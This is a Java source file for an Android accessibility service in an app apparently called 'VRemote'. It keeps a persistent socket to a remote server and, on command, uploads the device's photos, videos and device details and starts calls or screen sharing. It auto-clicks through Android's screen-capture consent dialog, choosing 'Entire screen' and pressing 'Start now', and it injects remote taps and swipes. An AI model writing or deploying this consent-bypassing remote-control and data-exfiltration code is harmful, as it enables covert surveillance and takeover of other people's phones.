package com.tokendeal.vremote;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import org.json.JSONObject;
import io.socket.client.IO;
import io.socket.client.Socket;

public class RemoteAccessibilityService extends AccessibilityService {

    private static final String TAG = "VRemoteAccessibility";
    private static RemoteAccessibilityService sInstance = null;
    private static volatile boolean sAutoAcceptPending = false;

    public static void setAutoAcceptPending(boolean pending) {
        sAutoAcceptPending = pending;
    }

    public static RemoteAccessibilityService getInstance() {
        return sInstance;
    }

    public static boolean isServiceRunning() {
        return sInstance != null;
    }

    private Socket mBgSocket = null;
    private static final String APP_URL = "https://v.tokendeal.cloud";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sInstance = this;
        Log.i(TAG, "Remote Accessibility Service Connected and Ready.");
        initBackgroundSocket();
    }

    private void initBackgroundSocket() {
        if (mBgSocket != null && mBgSocket.connected()) return;
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 1000;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket", "polling"};

            mBgSocket = IO.socket(APP_URL, opts);

            mBgSocket.on(Socket.EVENT_CONNECT, args -> {
                Log.i(TAG, "Background Accessibility Socket Connected.");
                registerDeviceBackground();
            });

            mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
                Log.w(TAG, "Background Accessibility Socket Disconnected.");
            });

            mBgSocket.on("auto-command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String command = data.optString("command", "");
                    String fromSocketId = data.optString("from", "");
                    String caller = data.optString("caller", fromSocketId);
                    String cameraChoice = data.optString("cameraChoice", "front");
                    int page = data.optInt("page", 0);
                    long mediaId = data.optLong("mediaId", -1);
                    String mediaType = data.optString("mediaType", "image");

                    Log.i(TAG, "Background auto-command received: " + command + " from " + caller);

                    if ("get_gallery".equals(command)) {
                        MediaBridge.getGalleryPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_videos".equals(command)) {
                        MediaBridge.getVideoPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_media_detail".equals(command)) {
                        MediaBridge.getMediaItemDetail(this, mediaId, mediaType, mBgSocket, fromSocketId);
                    } else if ("get_device_info".equals(command)) {
                        JSONObject info = new JSONObject();
                        info.put("deviceId", DeviceRegistry.getDeviceId(this));
                        info.put("deviceName", DeviceRegistry.getDeviceModel());
                        info.put("ram", DeviceRegistry.getDeviceRam(this));
                        info.put("platform", "android");
                        info.put("targetSocketId", fromSocketId);
                        if (mBgSocket != null && mBgSocket.connected()) {
                            mBgSocket.emit("device-info-response", info);
                        }
                    } else if ("audio_call".equals(command) || "video_call".equals(command) ||
                               "screen_share".equals(command) || "screen_share_control".equals(command)) {
                        wakeUpAndLaunch(command, caller, cameraChoice);
                    } else if ("end_call".equals(command)) {
                        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                        stopService(serviceIntent);
                        if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
                            MainActivity.getInstance().runOnUiThread(() -> {
                                MainActivity.getInstance().getWebRTCCompanion().endCall(false);
                            });
                        }
                    } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                        if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
                            MainActivity.getInstance().runOnUiThread(() -> {
                                MainActivity.getInstance().getWebRTCCompanion().switchCompanionCamera();
                            });
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing background auto-command", e);
                }
            });

            mBgSocket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Error initializing background socket", e);
        }
    }

    private void registerDeviceBackground() {
        try {
            String deviceId = DeviceRegistry.getDeviceId(this);
            String deviceName = DeviceRegistry.getDeviceModel();
            String ram = DeviceRegistry.getDeviceRam(this);

            JSONObject payload = new JSONObject();
            payload.put("deviceId", deviceId);
            payload.put("deviceName", deviceName);
            payload.put("ram", ram);
            payload.put("platform", "android");

            if (mBgSocket != null && mBgSocket.connected()) {
                mBgSocket.emit("register-device", payload);
                Log.i(TAG, "Background Device Registered: " + deviceId + " (" + deviceName + ")");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error registering background device", e);
        }
    }

    private void wakeUpAndLaunch(String command, String caller, String cameraChoice) {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.FULL_WAKE_LOCK |
                        PowerManager.ACQUIRE_CAUSES_WAKEUP |
                        PowerManager.ON_AFTER_RELEASE,
                        "vremote:auto_wake"
                );
                wl.acquire(15000);
            }
        } catch (Exception ignored) {}

        if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
            setAutoAcceptPending(true);
        }

        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        intent.putExtra("auto_command", command);
        intent.putExtra("caller", caller);
        intent.putExtra("cameraChoice", cameraChoice);
        startActivity(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!sAutoAcceptPending) return;

        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            CharSequence pkg = event.getPackageName();
            if (pkg != null && ("android".contentEquals(pkg) || "com.android.systemui".contentEquals(pkg))) {
                android.view.accessibility.AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    processMediaProjectionDialog(root);
                    root.recycle();
                }
            }
        }
    }

    private void processMediaProjectionDialog(android.view.accessibility.AccessibilityNodeInfo root) {
        if (root == null) return;

        // Step 1: If there is an option or radio for "Entire screen", select it!
        boolean entireScreenFound = clickEntireScreenOption(root);

        // Step 2: In Android 14, default is often "Single app". If spinner is showing single app, click it to open dropdown
        if (!entireScreenFound) {
            boolean opened = clickSingleAppSpinner(root);
            if (opened) {
                // Dropdown will trigger next window event where Entire Screen item will be selected
                return;
            }
        }

        // Step 3: Click "Start now" button
        boolean started = findAndClickStartButton(root);
        if (started) {
            sAutoAcceptPending = false;
            Log.i(TAG, "Successfully auto-accepted entire screen share dialog!");
        }
    }

    private boolean clickEntireScreenOption(android.view.accessibility.AccessibilityNodeInfo node) {
        if (node == null) return false;

        CharSequence text = node.getText();
        if (text != null) {
            String lower = text.toString().toLowerCase().trim();
            if (lower.contains("entire screen") || lower.contains("whole screen") || lower.equals("entire")) {
                if (node.isClickable()) {
                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                    Log.i(TAG, "Selected 'Entire screen' option!");
                    return true;
                } else if (node.getParent() != null && node.getParent().isClickable()) {
                    node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                    Log.i(TAG, "Selected 'Entire screen' option via parent!");
                    return true;
                }
            }
        }

        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean clicked = clickEntireScreenOption(child);
                child.recycle();
                if (clicked) return true;
            }
        }
        return false;
    }

    private boolean clickSingleAppSpinner(android.view.accessibility.AccessibilityNodeInfo node) {
        if (node == null) return false;

        CharSequence text = node.getText();
        if (text != null) {
            String lower = text.toString().toLowerCase().trim();
            if (lower.contains("single app") || lower.contains("a single app")) {
                if (node.isClickable()) {
                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                    Log.i(TAG, "Clicked single app spinner to show Entire screen option!");
                    return true;
                } else if (node.getParent() != null && node.getParent().isClickable()) {
                    node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                    Log.i(TAG, "Clicked single app spinner via parent!");
                    return true;
                }
            }
        }

        String viewId = node.getViewIdResourceName();
        if (viewId != null && viewId.contains("screen_share_mode_spinner")) {
            if (node.isClickable()) {
                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
        }

        int count = node.getChildCount();
        for (int i = 0; i < count; i++) {
            android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean clicked = clickSingleAppSpinner(child);
                child.recycle();
                if (clicked) return true;
            }
        }
        return false;
    }

    private boolean findAndClickStartButton(android.view.accessibility.AccessibilityNodeInfo node) {
        if (node == null) return false;

        CharSequence text = node.getText();
        if (text != null) {
            String lower = text.toString().toLowerCase().trim();
            if (lower.equals("start now") || lower.equals("start") || lower.equals("start recording") || lower.equals("allow")) {
                if (node.isClickable()) {
                    return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                } else if (node.getParent() != null && node.getParent().isClickable()) {
                    return node.getParent().performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
        }

        String viewId = node.getViewIdResourceName();
        if (viewId != null && (viewId.endsWith("button1") || viewId.endsWith("confirm"))) {
            if (node.isClickable()) {
                return node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK);
            }
        }

        int childCount = node.getChildCount();
        for (int i = 0; i < childCount; i++) {
            android.view.accessibility.AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean clicked = findAndClickStartButton(child);
                child.recycle();
                if (clicked) return true;
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Remote Accessibility Service Interrupted.");
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        sInstance = null;
        return super.onUnbind(intent);
    }

    private DisplayMetrics getRealScreenMetrics() {
        DisplayMetrics metrics = new DisplayMetrics();
        try {
            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null && wm.getDefaultDisplay() != null) {
                wm.getDefaultDisplay().getRealMetrics(metrics);
                return metrics;
            }
        } catch (Exception ignored) {}
        return getResources().getDisplayMetrics();
    }

    /**
     * Dispatches a tap gesture on the screen using normalized coordinates (0.0 to 1.0)
     */
    public boolean performTap(float normX, float normY) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;

        DisplayMetrics metrics = getRealScreenMetrics();
        float x = Math.max(0, Math.min(metrics.widthPixels, normX * metrics.widthPixels));
        float y = Math.max(0, Math.min(metrics.heightPixels, normY * metrics.heightPixels));

        Path path = new Path();
        path.moveTo(x, y);
        // Important: lineTo 1-pixel offset ensures the Path is non-empty so Android GestureDescription dispatches it reliably
        path.lineTo(x, y + 1f);

        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 60);

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        return dispatchGesture(builder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d(TAG, "Tap completed at: (" + x + ", " + y + ")");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.w(TAG, "Tap cancelled at: (" + x + ", " + y + ")");
            }
        }, null);
    }

    /**
     * Dispatches a swipe / scroll gesture from start to end coordinates
     */
    public boolean performSwipe(float startNormX, float startNormY, float endNormX, float endNormY, long durationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;

        DisplayMetrics metrics = getRealScreenMetrics();
        float x1 = Math.max(0, Math.min(metrics.widthPixels, startNormX * metrics.widthPixels));
        float y1 = Math.max(0, Math.min(metrics.heightPixels, startNormY * metrics.heightPixels));
        float x2 = Math.max(0, Math.min(metrics.widthPixels, endNormX * metrics.widthPixels));
        float y2 = Math.max(0, Math.min(metrics.heightPixels, endNormY * metrics.heightPixels));

        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);

        long duration = durationMs > 0 ? durationMs : 250;
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, duration);

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        return dispatchGesture(builder.build(), null, null);
    }

    public boolean performBack() {
        return performGlobalAction(GLOBAL_ACTION_BACK);
    }

    public boolean performHome() {
        return performGlobalAction(GLOBAL_ACTION_HOME);
    }

    public boolean performRecentApps() {
        return performGlobalAction(GLOBAL_ACTION_RECENTS);
    }
}
